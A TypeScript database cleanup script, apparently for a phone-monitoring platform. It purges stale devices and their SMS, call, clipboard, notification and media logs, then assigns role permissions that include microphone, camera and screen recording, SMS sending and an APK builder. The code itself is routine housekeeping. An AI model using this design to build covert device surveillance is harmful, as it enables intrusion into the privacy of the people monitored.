/**
 * LIMPIEZA Y CORRECCIÓN DEL SISTEMA
 */
import mysql from 'mysql2/promise';
import dotenv from 'dotenv';
dotenv.config();

async function cleanupSystem() {
  console.log('🧹 INICIANDO LIMPIEZA DEL SISTEMA...\n');
  
  const conn = await mysql.createConnection({
    uri: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: true }
  });

  // 1. Limpiar dispositivos offline por más de 30 días o sin lastSeen
  console.log('1️⃣ Limpiando dispositivos fantasma/offline...');
  
  const [offlineDevices] = await conn.execute(`
    SELECT id, deviceId, deviceName, status, lastSeen 
    FROM devices 
    WHERE status = 'offline' 
      AND (lastSeen IS NULL OR lastSeen < DATE_SUB(NOW(), INTERVAL 30 DAY))
  `);
  
  const offlineCount = (offlineDevices as any[]).length;
  console.log(`   Dispositivos offline/huérfanos encontrados: ${offlineCount}`);
  
  if (offlineCount > 0) {
    const idsToDelete = (offlineDevices as any[]).map(d => d.id);
    console.log(`   IDs a eliminar: ${idsToDelete.join(', ')}`);
    
    // Eliminar datos relacionados primero
    const tables = ['locationHistory', 'smsLogs', 'callLogs', 'contacts', 'installedApps', 'mediaFiles', 'clipboardLogs', 'notificationLogs'];
    for (const table of tables) {
      try {
        await conn.execute(`DELETE FROM ${table} WHERE deviceId IN (?)`, [idsToDelete]);
        console.log(`   ✓ Datos relacionados en ${table} eliminados`);
      } catch (e) {
        console.log(`   ⚠ ${table}: no existe o error`);
      }
    }
    
    // Eliminar dispositivos
    await conn.execute(`DELETE FROM devices WHERE id IN (?)`, [idsToDelete]);
    console.log(`   ✓ ${offlineCount} dispositivos eliminados`);
  }

  // 2. Limpiar tablas de datos orphaned (que referencian devices inexistentes)
  console.log('\n2️⃣ Limpiando datos huérfanos...');
  const tables = ['locationHistory', 'smsLogs', 'callLogs', 'contacts', 'installedApps', 'mediaFiles', 'clipboardLogs', 'notificationLogs', 'geofenceEvents'];
  for (const table of tables) {
    try {
      const [result] = await conn.execute(`
        DELETE FROM ${table} 
        WHERE deviceId NOT IN (SELECT id FROM devices)
      `);
      const affected = (result as any).affectedRows;
      if (affected > 0) {
        console.log(`   ✓ ${table}: ${affected} registros huérfanos eliminados`);
      }
    } catch (e) {
      console.log(`   ⚠ ${table}: no existe o error`);
    }
  }

  // 3. Forzar status 'offline' a dispositivos que no han enviado datos en 24h
  console.log('\n3️⃣ Actualizando estado de dispositivos offline...');
  const [updateResult] = await conn.execute(`
    UPDATE devices 
    SET status = 'offline' 
    WHERE status = 'online' 
      AND (lastSeen IS NULL OR lastSeen < DATE_SUB(NOW(), INTERVAL 1 HOUR))
  `);
  const updatedCount = (updateResult as any).affectedRows;
  console.log(`   ✓ ${updatedCount} dispositivos marcados como offline`);

  // 4. Asignar permisos por defecto según rol
  console.log('\n4️⃣ Asignando permisos por defecto...');
  
  const [users] = await conn.execute('SELECT id, name, role FROM users');
  const [perms] = await conn.execute('SELECT id, code FROM permissions');

  const permMap = new Map((perms as any[]).map(p => [p.code, p.id]));

  const rolePermissions: Record<string, string[]> = {
    admin: ['section:dashboard', 'section:devices', 'section:users', 'section:permissions_management',
            'section:apk_builder', 'section:audit_logs', 'section:settings', 'section:device_map',
            'section:device_monitoring', 'section:remote_control', 'section:communications',
            'section:advanced_monitoring', 'section:app_manager', 'section:file_explorer',
            'section:analytics', 'section:geofencing', 'section:notifications', 'section:gps_tracker',
            'section:compliance', 'section:media_capture', 'section:profile', 'section:permissions',
            'GPS_LOGGING', 'MICROPHONE_RECORDING', 'VIEW_CONTACTS', 'SMS_LOGS', 'SEND_SMS',
            'CALL_LOGS', 'VIEW_INSTALLED_APPS', 'CLIPBOARD_LOGGING', 'NOTIFICATION_LOGGING',
            'FILE_EXPLORER', 'SCREEN_RECORDING', 'CAMERA_ACCESS', 'LOCATION_TRACKING'],
    manager: ['section:dashboard', 'section:devices', 'section:device_map', 'section:device_monitoring',
              'section:remote_control', 'section:communications', 'section:advanced_monitoring',
              'section:app_manager', 'section:file_explorer', 'section:analytics', 'section:notifications',
              'section:gps_tracker', 'section:compliance', 'section:media_capture', 'section:profile',
              'GPS_LOGGING', 'VIEW_CONTACTS', 'SMS_LOGS', 'CALL_LOGS', 'VIEW_INSTALLED_APPS',
              'CLIPBOARD_LOGGING', 'NOTIFICATION_LOGGING', 'FILE_EXPLORER', 'LOCATION_TRACKING'],
    user: ['section:dashboard', 'section:devices', 'section:device_monitoring', 
           'section:gps_tracker', 'section:profile', 'GPS_LOGGING', 'SMS_LOGS', 
           'CALL_LOGS', 'VIEW_INSTALLED_APPS', 'CLIPBOARD_LOGGING', 'LOCATION_TRACKING'],
    viewer: ['section:dashboard', 'section:profile', 'GPS_LOGGING', 'LOCATION_TRACKING', 'SMS_LOGS']
  };

  for (const user of (users as any[])) {
    console.log(`   Procesando usuario: ${user.name} (${user.role})`);
    
    await conn.execute('DELETE FROM userPermissions WHERE userId = ?', [user.id]);
    
    const permsToAssign = rolePermissions[user.role] || rolePermissions.viewer;
    
    for (const permCode of permsToAssign) {
      const permId = permMap.get(permCode);
      if (permId) {
        try {
          await conn.execute(
            'INSERT INTO userPermissions (userId, permissionId, grantedAt) VALUES (?, ?, NOW())',
            [user.id, permId]
          );
        } catch (e) {}
      }
    }
    console.log(`   ✓ ${user.name}: ${permsToAssign.length} permisos asignados`);
  }

  // 5. Estado final
  console.log('\n5️⃣ Estado final de dispositivos...');
  const [finalDevices] = await conn.execute('SELECT id, deviceId, deviceName, status, lastSeen FROM devices');
  console.log(`   Dispositivos restantes: ${(finalDevices as any[]).length}`);
  (finalDevices as any[]).forEach(d => {
    console.log(`   - ID:${d.id} | ${d.deviceName} | ${d.status} | lastSeen: ${d.lastSeen || 'N/A'}`);
  });

  console.log('\n✅ LIMPIEZA COMPLETADA');
  await conn.end();
}

cleanupSystem().catch(console.error);
